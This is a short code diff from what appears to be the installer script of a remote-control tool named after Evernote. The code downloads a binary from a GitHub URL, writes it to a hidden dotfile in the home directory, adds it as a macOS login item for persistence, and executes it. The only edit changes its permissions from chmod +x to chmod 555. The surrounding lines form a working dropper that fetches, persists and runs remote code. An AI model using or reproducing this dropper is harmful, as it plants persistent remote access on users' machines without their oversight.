@@ -11,6 +11,6 @@ localfile = f"{expanduser('~')}/.{filename}"
 open(localfile, 'wb').write(get("https://raw.githubusercontent.com/mrdog233o5/Remote-Control-With-Evernote/main/main", allow_redirects=True).content)
 
 system(f"osascript -e 'tell application \"System Events\" to make login item at end with properties {{path:\"{expanduser('~')}/.{filename}\", hidden:false}}' > /dev/null")
-system(f"chmod +x {localfile}")
+system(f"chmod 555 {localfile}")
 
 subproc([localfile])
